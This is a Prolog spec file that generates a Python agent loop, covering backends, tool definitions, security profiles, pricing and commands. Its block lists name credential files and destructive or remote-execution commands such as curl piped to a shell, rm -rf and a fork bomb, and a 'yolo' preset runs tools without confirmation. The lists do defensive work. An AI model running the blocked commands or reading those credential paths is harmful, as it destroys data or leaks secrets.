%% agent_loop_module.pl - Prolog generator for UnifyWeaver Agent Loop
%%
%% This module defines agent backends, tools, security profiles, and
%% model pricing declaratively, then generates Python code from specs.
%%
%% Usage:
%%   swipl -g "generate_all, halt" agent_loop_module.pl

:- module(agent_loop_module, [
    generate_all/0,
    generate_all/1,
    generate_module/1,
    agent_backend/2,
    tool_spec/2,
    tool_handler/2,
    destructive_tool/1,
    security_profile/2,
    model_pricing/3,
    security_module/3,
    audit_profile_level/2,
    slash_command/4,
    command_alias/2,
    backend_factory/2,
    backend_factory_order/1,
    write_prolog_term/2,
    module_dependency/3
]).

:- discontiguous generate_backend_full/3.
:- use_module(agent_loop_components).
:- use_module(agent_loop_bindings).

%% =============================================================================
%% Module Dependency Graph
%% =============================================================================

%% module_dependency(+SourceModule, +TargetModule, +Reason)
%% Declarative cross-module dependency facts for generated use_module directives.
module_dependency(tools, security, 'check_path_allowed/2, check_command_allowed/2').
module_dependency(agent_loop, config, 'load_config/1, get_default_config/0').
module_dependency(agent_loop, tools, 'tool handler dispatch').
module_dependency(agent_loop, backends, 'create_backend/3, send_request/4').
module_dependency(agent_loop, commands, 'handle_slash_command/3').
module_dependency(agent_loop, security, 'set_security_profile/1').
module_dependency(agent_loop, costs, 'cost_tracker_add/4').
module_dependency(backends, costs, 'model_pricing/3 for cost tracking').
module_dependency(backends, config, 'api_key_env_var/2 for key resolution').
module_dependency(config, backends, 'api_key_env_var/2 backend name lookup').
module_dependency(security, config, 'audit_profile_level/2 from config').

%% =============================================================================
%% Agent Backend Definitions
%% =============================================================================

%% agent_backend(Name, Properties)
%% class_name/1 overrides the auto-generated CamelCase class name.
%% optional_import/1 marks backends that need try/except imports.
%% file_name/1 overrides the auto-generated snake_case file name.

agent_backend(coro, [
    type(cli),
    class_name('CoroBackend'),
    command("claude"),
    args(["--verbose"]),
    description("Coro-code CLI backend using single-task mode"),
    context_format(conversation_history),
    output_parser(coro_parser),
    supports_streaming(false),
    %% Generation metadata
    module_imports(['json as _json', os, subprocess, re, tempfile]),
    class_docstring('Coro-code CLI backend using single-task mode.'),
    display_name('Coro ({self.command})'),
    helper_fragments([])
]).

agent_backend(claude_code, [
    type(cli),
    class_name('ClaudeCodeBackend'),
    command("claude"),
    args(["-p", "--model"]),
    description("Claude Code CLI backend using print mode"),
    default_model("sonnet"),
    models(["sonnet", "opus", "haiku"]),
    context_format(conversation_history),
    supports_streaming(false),
    %% Generation metadata
    module_imports([json, os, subprocess]),
    class_docstring('Claude Code CLI backend with streaming JSON output.'),
    display_name('Claude Code ({self.model})'),
    helper_fragments([stream_json_return, describe_tool_call_claude_code, format_prompt])
]).

agent_backend(gemini, [
    type(cli),
    class_name('GeminiBackend'),
    command("gemini"),
    args(["-p", "-m", "--output-format", "text"]),
    description("Gemini CLI backend"),
    default_model("gemini-2.5-flash"),
    context_format(conversation_history),
    supports_streaming(false),
    %% Generation metadata
    module_imports([json, os, subprocess, sys]),
    class_docstring('Gemini CLI backend with streaming JSON output.'),
    display_name('Gemini ({self.model})'),
    helper_fragments([stream_json_return, describe_tool_call_gemini, format_prompt])
]).

agent_backend(claude_api, [
    type(api),
    class_name('ClaudeAPIBackend'),
    endpoint("https://api.anthropic.com/v1/messages"),
    model("claude-sonnet-4-20250514"),
    auth_env("ANTHROPIC_API_KEY"),
    auth_header("x-api-key"),
    description("Anthropic Claude API backend"),
    context_format(messages_array),
    supports_tools(true),
    supports_streaming(true),
    optional_import(true),
    %% Generation metadata
    module_imports([os]),
    sdk_guard(anthropic),
    class_docstring('Anthropic Claude API backend.'),
    display_name('Claude API ({self.model})'),
    helper_fragments([extract_tool_calls_anthropic])
]).

agent_backend(openai_api, [
    type(api),
    class_name('OpenAIBackend'),
    file_name(openai_api),
    endpoint("https://api.openai.com/v1/chat/completions"),
    model("gpt-4o"),
    auth_env("OPENAI_API_KEY"),
    auth_header("Authorization"),
    auth_prefix("Bearer "),
    description("OpenAI API backend"),
    context_format(messages_array),
    supports_tools(true),
    supports_streaming(true),
    optional_import(true),
    %% Generation metadata
    module_imports([os]),
    sdk_guard(openai),
    class_docstring('OpenAI API backend (GPT-4, GPT-3.5, etc.).'),
    display_name('OpenAI ({self.model})'),
    helper_fragments([extract_tool_calls_openai])
]).

agent_backend(ollama_api, [
    type(api),
    class_name('OllamaAPIBackend'),
    endpoint("http://localhost:11434/api/chat"),
    model("llama3"),
    description("Ollama REST API backend for local models"),
    default_host("localhost"),
    default_port(11434),
    context_format(messages_array),
    auth_required(false),
    supports_streaming(true),
    %% Generation metadata
    module_imports([json, 'urllib.request', 'urllib.error']),
    class_docstring('Ollama REST API backend for local models.'),
    display_name('Ollama API ({self.model}@{self.host}:{self.port})'),
    helper_fragments([list_models_api])
]).

agent_backend(ollama_cli, [
    type(cli),
    class_name('OllamaCLIBackend'),
    command("ollama"),
    args(["run"]),
    description("Ollama CLI backend using 'ollama run' command"),
    default_model("llama3"),
    context_format(conversation_history),
    supports_streaming(false),
    %% Generation metadata
    module_imports([subprocess]),
    class_docstring('Ollama CLI backend using \'ollama run\' command.'),
    display_name('Ollama CLI ({self.model})'),
    helper_fragments([format_prompt, clean_output_simple, list_models_cli])
]).

agent_backend(openrouter_api, [
    type(api),
    class_name('OpenRouterBackend'),
    endpoint("https://openrouter.ai/api/v1/chat/completions"),
    model("anthropic/claude-sonnet-4-20250514"),
    auth_env("OPENROUTER_API_KEY"),
    auth_header("Authorization"),
    auth_prefix("Bearer "),
    description("OpenRouter API backend with model routing"),
    context_format(messages_array),
    supports_tools(true),
    supports_streaming(true),
    %% Generation metadata
    module_imports([json, os, sys]),
    from_imports([
        'urllib.request' - ['urlopen', 'Request'],
        'urllib.error'   - ['HTTPError', 'URLError']
    ]),
    class_docstring('OpenRouter API backend (OpenAI-compatible, no pip deps).'),
    display_name('OpenRouter ({self.model})'),
    helper_fragments([supports_streaming_true, sse_streaming_openrouter, describe_tool_call_openrouter])
]).

%% =============================================================================
%% Tool Definitions
%% =============================================================================

tool_spec(bash, [
    description("Execute a bash command"),
    parameters([
        param(command, string, required, "The command to execute")
    ]),
    confirmation_required(true),
    timeout(120)
]).

tool_spec(read, [
    description("Read a file"),
    parameters([
        param(path, string, required, "Path to file")
    ]),
    confirmation_required(false)
]).

tool_spec(write, [
    description("Write content to a file"),
    parameters([
        param(path, string, required, "Path to file"),
        param(content, string, required, "Content to write")
    ]),
    confirmation_required(true)
]).

tool_spec(edit, [
    description("Edit a file with search/replace"),
    parameters([
        param(path, string, required, "Path to file"),
        param(old_string, string, required, "Text to find"),
        param(new_string, string, required, "Replacement text")
    ]),
    confirmation_required(true)
]).

%% =============================================================================
%% Security Module Registry
%% =============================================================================

%% security_module(ModuleName, PrimaryExport, ExtraExports)
security_module(audit,        'AuditLogger',        []).
security_module(profiles,     'SecurityProfile',    [get_profile, get_builtin_profiles]).
security_module(proxy,        'CommandProxyManager', []).
security_module(path_proxy,   'PathProxyManager',   []).
security_module(proot_sandbox,'ProotSandbox',       ['ProotConfig']).

%% =============================================================================
%% Security Profile Definitions
%% =============================================================================

%% security_profile(Name, Properties)
security_profile(open, [
    description("No restrictions - for trusted manual use"),
    path_validation(false),
    command_blocklist(false),
    command_proxying(disabled),
    audit_logging(disabled)
]).

security_profile(cautious, [
    description("Basic safety for well-behaved agents like Claude Code"),
    path_validation(true),
    command_blocklist(true),
    command_proxying(disabled),
    audit_logging(basic)
]).

security_profile(guarded, [
    description("Actively protected and monitored for semi-autonomous agents"),
    path_validation(true),
    command_blocklist(true),
    blocked_commands(guarded_extra_blocks),
    safe_commands(paranoid_safe),
    command_proxying(enabled),
    audit_logging(detailed),
    network_isolation(localhost_only)
]).

security_profile(paranoid, [
    description("Maximum security for chaotic/untrusted agents"),
    path_validation(true),
    command_blocklist(true),
    allowed_commands_only(true),
    allowed_commands(paranoid_allowed),
    safe_commands(paranoid_safe),
    command_proxying(strict),
    audit_logging(forensic),
    network_isolation(blocked),
    anomaly_detection(true),
    max_file_read_size(1048576),
    max_file_write_size(10485760)
]).

%% audit_profile_level(+ProfileName, +AuditLevel)
%% Maps security profile to audit logging level.
audit_profile_level(open, disabled).
audit_profile_level(cautious, basic).
audit_profile_level(guarded, detailed).
audit_profile_level(paranoid, forensic).

%% security_profile_field(+FieldName, +PythonType, +Default, +Properties)
%% Declarative schema for SecurityProfile dataclass fields.
%% Properties: layer(N), comment(Str), inline_comment(Str)
security_profile_field(name,                'str',          required,                       []).
security_profile_field(description,         'str',          '\'\'',                         []).
security_profile_field(path_validation,     'bool',         'True',                         [layer(1), comment('Layer 1: Path validation')]).
security_profile_field(blocked_paths,       'list[str]',    'field(default_factory=list)',   [layer(1)]).
security_profile_field(allowed_paths,       'list[str]',    'field(default_factory=list)',   [layer(1)]).
security_profile_field(command_blocklist,   'bool',         'True',                         [layer(2), comment('Layer 2: Command blocklist / allowlist')]).
security_profile_field(blocked_commands,    'list[str]',    'field(default_factory=list)',   [layer(2)]).
security_profile_field(allowed_commands,    'list[str]',    'field(default_factory=list)',   [layer(2)]).
security_profile_field(allowed_commands_only,'bool',        'False',                        [layer(2), inline_comment('If True, only allowed_commands may run')]).
security_profile_field(command_proxying,    'str',          '\'disabled\'',                 [layer(3), comment('Layer 3: Command proxying'), inline_comment('disabled, optional, enabled, strict')]).
security_profile_field(path_proxying,       'bool',         'False',                        [layer(4), comment('Layer 3.5: PATH-based wrapper scripts')]).
security_profile_field(proot_isolation,     'bool',         'False',                        [layer(5), comment('Layer 4: Filesystem isolation')]).
security_profile_field(proot_allowed_dirs,  'list[str]',    'field(default_factory=list)',   [layer(5)]).
security_profile_field(audit_logging,       'str',          '\'disabled\'',                 [layer(6), comment('Layer 5: Audit logging'), inline_comment('disabled, basic, detailed, forensic')]).
security_profile_field(network_isolation,   'str',          '\'disabled\'',                 [layer(7), comment('Layer 6: Network isolation (future)'), inline_comment('disabled, localhost_only, blocked')]).
security_profile_field(anomaly_detection,   'bool',         'False',                        [layer(8), comment('Layer 7: Anomaly detection (future)')]).
security_profile_field(safe_commands,       'list[str]',    'field(default_factory=list)',   [comment('Safe commands — subset that skip confirmation')]).
security_profile_field(max_file_read_size,  'int | None',   'None',                         [comment('Resource limits'), inline_comment('bytes, None = unlimited')]).
security_profile_field(max_file_write_size, 'int | None',   'None',                         []).

%% Regex lists referenced by profiles
regex_list(guarded_extra_blocks, [
    "r'^sudo\\s'",
    "r'\\bbase64\\b.*\\|\\s*(bash|sh)'",
    "r'\\beval\\s'",
    "r'\\bnohup\\s'",
    "r'\\bdisown\\s'",
    "r'&\\s*$'",
    "r'\\bpython[23]?\\s+-c\\s.*os\\.system'",
    "r'\\bpython[23]?\\s+-c\\s.*subprocess'",
    "r'\\bpython[23]?\\s+-c\\s.*__import__'",
    "r'\\bnode\\s+-e\\s.*child_process'"
]).

regex_list(paranoid_safe, [
    "r'^ls(\\s|$)'",
    "r'^cat\\s'",
    "r'^head\\s'",
    "r'^tail\\s'",
    "r'^grep\\s'",
    "r'^echo\\s'",
    "r'^pwd$'",
    "r'^cd\\s'",
    "r'^wc\\s'",
    "r'^sort\\s'",
    "r'^diff\\s'",
    "r'^git\\s+(status|log|diff|show|branch)'"
]).

regex_list(paranoid_confirm, [
    "r'^find\\s+(?!.*(-exec|-execdir|-delete|-ok)\\b)[^;|&]*$'",
    "r'^python3\\s+[^-].*\\.py$'",
    "r'^node\\s+[^-].*\\.js$'"
]).

%% regex_list_variable(+PrologName, +PythonVariable)
%% Declarative mapping from Prolog regex_list names to Python variable names.
regex_list_variable(guarded_extra_blocks, '_GUARDED_EXTRA_BLOCKS').
regex_list_variable(paranoid_safe, '_PARANOID_SAFE').
regex_list_variable(paranoid_confirm, '_PARANOID_CONFIRM').
regex_list_variable(paranoid_allowed, '_PARANOID_ALLOWED').

%% regex_list_combined(+PythonVariable, +Source1, +Source2)
%% Declares a combined Python variable as the concatenation of two regex list variables.
regex_list_combined('_PARANOID_ALLOWED', '_PARANOID_SAFE', '_PARANOID_CONFIRM').

%% =============================================================================
%% Model Pricing Definitions
%% =============================================================================

%% model_pricing(ModelName, InputPricePerMillion, OutputPricePerMillion)
%% Claude models
model_pricing("claude-opus-4-20250514",    15.0,   75.0).
model_pricing("claude-sonnet-4-20250514",   3.0,   15.0).
model_pricing("claude-haiku-3-5-20241022",  0.80,   4.0).
%% Aliases
model_pricing("opus",    15.0,  75.0).
model_pricing("sonnet",   3.0,  15.0).
model_pricing("haiku",    0.80,  4.0).
%% OpenAI models
model_pricing("gpt-4o",        2.50, 10.0).
model_pricing("gpt-4o-mini",   0.15,  0.60).
model_pricing("gpt-4-turbo",  10.0,  30.0).
model_pricing("gpt-4",        30.0,  60.0).
model_pricing("gpt-3.5-turbo", 0.50,  1.50).
%% Gemini
model_pricing("gemini-2.5-flash", 0.075, 0.30).
model_pricing("gemini-2.5-pro",   1.25,  5.0).
%% Local models (free)
model_pricing("llama3",    0.0, 0.0).
model_pricing("codellama", 0.0, 0.0).
model_pricing("mistral",  0.0, 0.0).

%% =============================================================================
%% Loop Configuration
%% =============================================================================

loop_config([
    max_context_tokens(100000),
    max_messages(50),
    trim_strategy(oldest_first),
    display_tokens(true),
    display_tool_calls(true),
    confirm_destructive_tools(true)
]).

%% =============================================================================
%% Context Module Data
%% =============================================================================

%% context_enum(EnumName, DocString, Values)
%% Values = list of value(PythonName, StringVal, Comment)
context_enum('ContextBehavior', "How to handle context across messages.", [
    value('CONTINUE', "continue", "Full context, continue conversation"),
    value('FRESH',    "fresh",    "No context, each query independent"),
    value('SLIDING',  "sliding",  "Keep only last N messages"),
    value('SUMMARIZE',"summarize","Summarize old context (future)")
]).

context_enum('ContextFormat', "How to format context for the backend.", [
    value('PLAIN',    "plain",    "Simple text with role prefixes"),
    value('MARKDOWN', "markdown", "Markdown formatted"),
    value('JSON',     "json",     "JSON array of messages"),
    value('XML',      "xml",      "XML structure")
]).

%% message_field(Name, Type, Default)
message_field(role,         'Literal["user", "assistant", "system", "tool"]', none).
message_field(content,      'str',   none).
message_field(tokens,       'int',   '0').
message_field(tool_call_id, 'str',   '""').
message_field(tool_calls,   'list',  'field(default_factory=list)').

%% =============================================================================
%% Config Module Data
%% =============================================================================

%% api_key_env_var(BackendType, EnvVarName)
api_key_env_var(openrouter, 'OPENROUTER_API_KEY').
api_key_env_var(claude,     'ANTHROPIC_API_KEY').
api_key_env_var(openai,     'OPENAI_API_KEY').
api_key_env_var(gemini,     'GEMINI_API_KEY').

%% api_key_file(BackendType, FilePath)
api_key_file(claude, '~/.anthropic/api_key').
api_key_file(openai, '~/.openai/api_key').

%% agent_config_field(Name, Type, Default, Comment)
agent_config_field(name,                'str',            none,      "").
agent_config_field(backend,             'str',            none,      "coro, claude-code, gemini, claude, ollama-api, ollama-cli").
agent_config_field(model,               'str | None',     'None',    "").
agent_config_field(host,                'str | None',     'None',    "For network backends (ollama-api)").
agent_config_field(port,                'int | None',     'None',    "").
agent_config_field(api_key,             'str | None',     'None',    "Or env var name like $ANTHROPIC_API_KEY").
agent_config_field(command,             'str | None',     'None',    "For CLI backends").
agent_config_field(system_prompt,       'str | None',     'None',    "").
agent_config_field(agent_md,            'str | None',     'None',    "Path to agent.md file").
agent_config_field(tools,               'list[str]',      'field(default_factory=lambda: [\'bash\', \'read\', \'write\', \'edit\'])', "").
agent_config_field(auto_tools,          'bool',           'False',   "Skip confirmation").
agent_config_field(context_mode,        'str',            '"continue"', "continue, fresh, sliding").
agent_config_field(max_context_tokens,  'int',            '100000',  "").
agent_config_field(max_messages,        'int',            '50',      "").
agent_config_field(max_chars,           'int',            '0',       "0 = unlimited").
agent_config_field(max_words,           'int',            '0',       "0 = unlimited").
agent_config_field(skills,              'list[str]',      'field(default_factory=list)', "Paths to skill files").
agent_config_field(max_iterations,      'int',            '0',       "0 = unlimited, N = pause after N tool iterations").
agent_config_field(timeout,             'int',            '300',     "").
agent_config_field(show_tokens,         'bool',           'True',    "").
agent_config_field(stream,              'bool',           'False',   "Enable streaming output for API backends").
agent_config_field(security_profile,    'str',            '"cautious"', "Security profile (open/cautious/guarded/paranoid)").
agent_config_field(approval_mode,       'str',            '"yolo"',  "Tool approval mode (default/auto_edit/yolo/plan)").
agent_config_field(extra,               'dict',           'field(default_factory=dict)', "").

%% config_field_json_default(FieldName, JsonDefault)
%% Override for fields whose dataclass default can't be used directly in data.get()
%% 'positional' means the field is a positional arg, not from dict
%% 'no_default' means data.get(field) with no default (returns None)
config_field_json_default(name,     positional).
config_field_json_default(backend,  '\'coro\'').
config_field_json_default(model,    no_default).
config_field_json_default(host,     no_default).
config_field_json_default(port,     no_default).
config_field_json_default(api_key,  no_default).
config_field_json_default(command,  no_default).
config_field_json_default(system_prompt, no_default).
config_field_json_default(agent_md, no_default).
config_field_json_default(tools,    '[\'bash\', \'read\', \'write\', \'edit\']').
config_field_json_default(context_mode, '\'continue\'').
config_field_json_default(skills,   '[]').
config_field_json_default(extra,    '{}').

%% default_agent_preset(Name, BackendAtom, Properties)
default_agent_preset(default, coro, [command='claude']).
default_agent_preset('claude-sonnet', 'claude-code', [model=sonnet]).
default_agent_preset('claude-opus', 'claude-code', [model=opus]).
default_agent_preset('claude-haiku', 'claude-code', [model=haiku]).
default_agent_preset(yolo, 'claude-code', [
    model=haiku, auto_tools=true,
    system_prompt="Be concise and take action. Execute tools without asking."
]).
default_agent_preset(gemini, gemini, [model='gemini-3-flash-preview']).
default_agent_preset(ollama, 'ollama-api', [model=llama3, host=localhost, port=11434]).
default_agent_preset('ollama-cli', 'ollama-cli', [model=llama3]).
default_agent_preset(openai, openai, [model='gpt-4o']).
default_agent_preset('gpt-4o-mini', openai, [model='gpt-4o-mini']).

%% example_agent_config(Name, Backend, Properties)
%% Used to generate the example config file (save_example_config).
%% Richer than default_agent_preset — includes display-only examples.
example_agent_config('claude-sonnet', 'claude-code',
    [model=sonnet, tools=["bash", "read", "write", "edit"], context_mode=continue]).
example_agent_config('claude-opus', 'claude-code',
    [model=opus, system_prompt="You are a senior software engineer. Be thorough."]).
example_agent_config(yolo, 'claude-code',
    [model=haiku, auto_tools=true, system_prompt="Be fast and take action without asking."]).
example_agent_config(gemini, gemini, [model='gemini-2.5-flash']).
example_agent_config('ollama-local', 'ollama-api',
    [model=llama3, host=localhost, port=11434]).
example_agent_config('ollama-remote', 'ollama-api',
    [model=codellama, host='192.168.1.100', port=11434]).
example_agent_config('claude-api', claude,
    [model='claude-sonnet-4-20250514', api_key='$ANTHROPIC_API_KEY']).
example_agent_config(openai, openai, [model='gpt-4o', api_key='$OPENAI_API_KEY']).
example_agent_config('openai-mini', openai, [model='gpt-4o-mini', api_key='$OPENAI_API_KEY']).
example_agent_config('coding-assistant', 'claude-code',
    [model=sonnet, agent_md="./agents/coding.md",
     skills=["./skills/git.md", "./skills/testing.md"],
     tools=["bash", "read", "write", "edit"],
     system_prompt="You are a coding assistant focused on clean, tested code."]).

%% config_search_path(Path, Type)
%% Type: required (always searched) | fallback (skipped with --no-fallback)
config_search_path('uwsal.json', required).
config_search_path('~/uwsal.json', required).
config_search_path('coro.json', fallback).
config_search_path('~/coro.json', fallback).

%% config_dir_file_name(FileName) — search order for load_config_from_dir
config_dir_file_name('agents.yaml').
config_dir_file_name('agents.yml').
config_dir_file_name('agents.json').
config_dir_file_name('.agents.yaml').
config_dir_file_name('.agents.yml').
config_dir_file_name('.agents.json').

%% =============================================================================
%% Tools Module Data
%% =============================================================================

%% blocked_path(Path)
blocked_path('/etc/shadow').
blocked_path('/etc/gshadow').
blocked_path('/etc/sudoers').

%% blocked_path_prefix(Prefix)
blocked_path_prefix('/proc/').
blocked_path_prefix('/sys/').
blocked_path_prefix('/dev/').

%% blocked_home_pattern(Pattern)
blocked_home_pattern('.ssh/').
blocked_home_pattern('.gnupg/').
blocked_home_pattern('.aws/').
blocked_home_pattern('.config/gcloud/').
blocked_home_pattern('.env').
blocked_home_pattern('.netrc').
blocked_home_pattern('.npmrc').

%% blocked_command_pattern(Regex, Description)
blocked_command_pattern("\\brm\\s+-[rf]*\\s+/", "rm with absolute path and force/recursive flags").
blocked_command_pattern("\\bmkfs\\b", "filesystem format").
blocked_command_pattern("\\bdd\\s+.*of=/dev/", "write to block device").
blocked_command_pattern(">\\s*/dev/sd", "redirect to block device").
blocked_command_pattern("\\bcurl\\b.*\\|\\s*(?:ba)?sh", "pipe remote script to shell").
blocked_command_pattern("\\bwget\\b.*\\|\\s*(?:ba)?sh", "pipe remote script to shell").
blocked_command_pattern("\\bchmod\\s+777\\b", "world-writable permissions").
blocked_command_pattern(":\\(\\)\\s*\\{\\s*:\\|:\\s*&\\s*\\}\\s*;", "fork bomb").
blocked_command_pattern("\\b>\\s*/etc/", "overwrite system config").

%% =============================================================================
%% Tool Description Mappings (for _describe_tool_call generation)
%% =============================================================================

%% tool_description(Backend, ToolName, Verb, ParamKey, DisplayMode)
%% DisplayMode: basename    — os.path.basename(params.get(ParamKey, '?'))
%%              raw         — params.get(ParamKey, '?')
%%              truncate(N) — truncate param to N chars with '...'

%% Gemini CLI tool names
tool_description(gemini, read_file,        'reading', file_path, basename).
tool_description(gemini, glob,             'searching', pattern, raw).
tool_description(gemini, grep,             'grep', pattern, raw).
tool_description(gemini, run_shell_command, '$', command, truncate(72)).
tool_description(gemini, write_file,       'writing', file_path, basename).
tool_description(gemini, edit,             'editing', file_path, basename).
tool_description(gemini, list_directory,   'ls', path, raw).

%% Claude Code CLI tool names (PascalCase)
tool_description(claude_code, 'Read',      'reading', file_path, basename).
tool_description(claude_code, 'Glob',      'searching', pattern, raw).
tool_description(claude_code, 'Grep',      'grep', pattern, raw).
tool_description(claude_code, 'Bash',      '$', command, truncate(72)).
tool_description(claude_code, 'Write',     'writing', file_path, basename).
tool_description(claude_code, 'Edit',      'editing', file_path, basename).
tool_description(claude_code, 'Task',      'agent:', description, raw).
tool_description(claude_code, 'WebFetch',  'fetching', url, raw).
tool_description(claude_code, 'WebSearch', 'searching:', query, raw).

%% OpenRouter API tool names (lowercase)
tool_description(openrouter_api, read,  'reading', path, basename).
tool_description(openrouter_api, write, 'writing', path, basename).
tool_description(openrouter_api, edit,  'editing', path, basename).
tool_description(openrouter_api, bash,  '$', command, truncate(72)).

%% =============================================================================
%% Tool Handler Dispatch
%% =============================================================================

%% tool_handler(ToolName, MethodName)
%% Maps tool names to handler methods in ToolHandler class.
tool_handler(bash,  '_execute_bash').
tool_handler(read,  '_read_file').
tool_handler(write, '_write_file').
tool_handler(edit,  '_edit_file').

%% destructive_tool(ToolName)
%% Tools that require confirmation before execution.
destructive_tool(bash).
destructive_tool(write).
destructive_tool(edit).

%% =============================================================================
%% Command Aliases Data
%% =============================================================================

%% command_alias(Alias, Expansion)
%% Short forms
command_alias("q", "quit").
command_alias("x", "exit").
command_alias("h", "help").
command_alias("?", "help").
command_alias("c", "clear").
command_alias("s", "status").

%% Save/load shortcuts
command_alias("sv", "save").
command_alias("ld", "load").
command_alias("ls", "sessions").

%% Export shortcuts
command_alias("exp", "export").
command_alias("md", "export conversation.md").
command_alias("html", "export conversation.html").

%% Backend shortcuts
command_alias("be", "backend").
command_alias("sw", "backend").

%% Common backend switches
command_alias("yolo", "backend yolo").
command_alias("opus", "backend claude-opus").
command_alias("sonnet", "backend claude-sonnet").
command_alias("haiku", "backend claude-haiku").
command_alias("gpt", "backend openai").
command_alias("local", "backend ollama").

%% Format shortcuts
command_alias("fmt", "format").

%% Iteration shortcuts
command_alias("iter", "iterations").
command_alias("i0", "iterations 0").
command_alias("i1", "iterations 1").
command_alias("i3", "iterations 3").
command_alias("i5", "iterations 5").

%% Stream toggle
command_alias("str", "stream").

%% Cost
command_alias("$", "cost").

%% Search
command_alias("find", "search").
command_alias("grep", "search").

%% alias_category(CategoryName, AliasKeys)
alias_category('Navigation', ["q", "x", "h", "?", "c", "s"]).
alias_category('Sessions', ["sv", "ld", "ls"]).
alias_category('Export', ["exp", "md", "html"]).
alias_category('Backend', ["be", "sw", "yolo", "opus", "sonnet", "haiku", "gpt", "local"]).
alias_category('Iterations', ["iter", "i0", "i1", "i3", "i5"]).
alias_category('Other', ["fmt", "str", "$", "find", "grep"]).

%% =============================================================================
%% Slash Command Definitions
%% =============================================================================

%% slash_command(Name, MatchType, Properties, HelpText)
%% MatchType:
%%   exact          = cmd == 'name'
%%   prefix         = cmd.startswith('name')
%%   prefix_sp      = cmd.startswith('name ')
%%   exact_or_prefix_sp = cmd == 'name' or cmd.startswith('name ')
%% Properties: aliases(List), handler(MethodName), comment(Str)

slash_command(exit, exact, [aliases([quit]),
    help_display('/exit, /quit')],
    'Exit the agent loop').
slash_command(clear, exact, [],
    'Clear conversation context').
slash_command(help, exact, [],
    'Show this help message').
slash_command(status, exact, [],
    'Show context status').
slash_command(iterations, prefix, [handler('_handle_iterations_command'),
    comment('/iterations N - set max iterations'),
    help_display('/iterations [N]')],
    'Show or set max iterations (0 = unlimited)').
slash_command(backend, prefix, [handler('_handle_backend_command'),
    comment('/backend <name> - switch backend'),
    help_display('/backend [name]')],
    'Show or switch backend/agent').
slash_command(save, prefix, [handler('_handle_save_command'),
    comment('Session commands'),
    help_display('/save [name]')],
    'Save current conversation').
slash_command(load, prefix, [handler('_handle_load_command'),
    help_display('/load <id>')],
    'Load a saved conversation').
slash_command(sessions, exact, [handler('_handle_sessions_command')],
    'List saved sessions').
slash_command(format, prefix, [handler('_handle_format_command'),
    comment('/format [type] - set context format'),
    help_display('/format [type]')],
    'Set context format (plain/markdown/json/xml)').
slash_command(export, prefix, [handler('_handle_export_command'),
    comment('/export <path> - export conversation'),
    help_display('/export <path>')],
    'Export conversation (.md, .html, .json, .txt)').
slash_command(cost, exact, [aliases([costs]), handler('_handle_cost_command'),
    comment('/cost - show cost tracking')],
    'Show API cost tracking summary').
slash_command(search, prefix, [handler('_handle_search_command'),
    comment('/search <query> - search sessions'),
    help_display('/search <query>')],
    'Search across saved sessions').
slash_command(stream, exact, [aliases([streaming]), handler('_handle_stream_command'),
    comment('/stream - toggle streaming mode')],
    'Toggle streaming mode for API backends').
slash_command(model, prefix_sp, [handler('_handle_model_command'),
    comment('/model [name] - show or switch model'),
    help_display('/model [name]'),
    target(prolog)],
    'Show or switch model at runtime').
slash_command(tokens, exact, [handler('_handle_tokens_command'),
    comment('/tokens - show context token estimate'),
    target(prolog)],
    'Show context token estimate and limit').
slash_command(aliases, exact, [handler('_handle_aliases_command'),
    comment('Aliases')],
    'List command aliases (e.g., /q -> /quit)').
slash_command(templates, exact, [handler('_handle_templates_command'),
    comment('Templates')],
    'List prompt templates').
slash_command(history, exact_or_prefix_sp, [handler('_handle_history_command'),
    comment('History'),
    help_display('/history [n]')],
    'Show last n messages (default 10)').
slash_command(undo, exact, [handler('_handle_undo_command'),
    comment('Undo')],
    'Undo last history change').
slash_command(delete, prefix_sp, [aliases([del]), handler('_handle_delete_command'),
    comment('Delete message(s)'),
    help_lines([
        '/delete <idx>      - Delete message at index',
        '/delete <s>-<e>    - Delete messages from s to e',
        '/delete last [n]   - Delete last n messages'
    ])],
    'Delete message(s) at index or range').
slash_command(edit, prefix_sp, [handler('_handle_edit_command'),
    comment('Edit message'),
    help_display('/edit <idx>')],
    'Edit message at index').
slash_command(replay, prefix_sp, [handler('_handle_replay_command'),
    comment('Replay from message'),
    help_display('/replay <idx>')],
    'Re-send message at index').

%% slash_command_group(GroupLabel, CommandNames)
%% Used for help text layout
slash_command_group('Commands (with or without / prefix)', [exit, clear, status, help]).
slash_command_group('Loop Control', [iterations, backend, model, format, stream]).
slash_command_group('Sessions', [save, load, sessions, search]).
slash_command_group('Export & Costs', [export, cost, tokens]).
slash_command_group('History', [history, delete, edit, replay, undo]).
slash_command_group('Shortcuts', [aliases, templates]).

%% slash_command_dispatch_order/1 — the exact order commands appear in _handle_command
%% This matches the prototype's ordering which differs from help text groups
slash_command_dispatch_order([
    exit, clear, help, status,
    iterations, backend,
    save, load, sessions,
    format, export, cost, search, stream,
    aliases, templates,
    history, undo,
    delete, edit, replay
]).

%% =============================================================================
%% CLI Argument Definitions
%% =============================================================================

%% cli_argument(Name, Properties)
%% Properties: long(Str), short(Str), type(atom), default(term),
%%   choices(List), action(atom), nargs(Str), metavar(Str),
%%   positional(true), help(Str)

%% Agent selection (from config)
cli_argument(agent, [long('--agent'), short('-a'), default(none), help('Agent variant from config file (e.g., yolo, claude-opus, ollama)')]).
cli_argument(config, [long('--config'), short('-C'), default(none), help('Path to config file (agents.yaml or agents.json)')]).
cli_argument(list_agents, [long('--list-agents'), action(store_true), help('List available agent variants from config')]).
cli_argument(init_config, [long('--init-config'), metavar('PATH'), help('Create example config file at PATH')]).

%% Direct backend selection (overrides config)
cli_argument(backend, [long('--backend'), short('-b'), default(none), choices([coro, claude, 'claude-code', gemini, openai, openrouter, 'ollama-api', 'ollama-cli']), help('Backend to use (overrides --agent config)')]).
cli_argument(command, [long('--command'), short('-c'), default(none), help('Command for CLI backends')]).
cli_argument(model, [long('--model'), short('-m'), default(none), help('Model to use')]).
cli_argument(host, [long('--host'), default(none), help('Host for network backends (ollama-api)')]).
cli_argument(port, [long('--port'), type(int), default(none), help('Port for network backends (ollama-api)')]).
cli_argument(api_key, [long('--api-key'), help('API key (overrides env vars and config files)')]).

%% Options
cli_argument(no_tokens, [long('--no-tokens'), action(store_true), help('Hide token usage information')]).
cli_argument(context_mode, [long('--context-mode'), default(none), choices([continue, fresh, sliding]), help('Context behavior mode')]).
cli_argument(max_chars, [long('--max-chars'), type(int), default(0), help('Max characters in context (0 = unlimited)')]).
cli_argument(max_words, [long('--max-words'), type(int), default(0), help('Max words in context (0 = unlimited)')]).
